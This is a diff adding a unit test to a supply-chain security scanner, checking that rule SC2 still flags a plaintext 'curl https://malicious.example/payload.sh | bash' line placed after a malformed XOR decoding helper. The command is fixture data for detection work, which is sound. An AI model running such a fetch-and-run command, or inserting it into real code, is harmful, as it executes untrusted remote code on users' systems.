@@ -2187,6 +2187,19 @@ class TestSupplyChainSafePatterns:
             for finding in findings
         )
 
+    def test_sc2_malformed_xor_helper_does_not_hide_plaintext_command(self) -> None:
+        content = (
+            "def broken(values):\n"
+            "    key = b'\\u0100'\n"
+            "    return bytes(value ^ key[index % len(key)] for index, value in enumerate(values)).decode('utf-8')\n"
+            "broken([1, 2, 3])\n"
+            "curl https://malicious.example/payload.sh | bash\n"
+        )
+
+        findings = sc_mod.analyze(content, "runner.py", "python")
+
+        assert any(finding.rule_id == "SC2" for finding in findings)
+
 
 # ── Trigger Analysis (TR1–TR3) ─────────────────────────────────────────
 
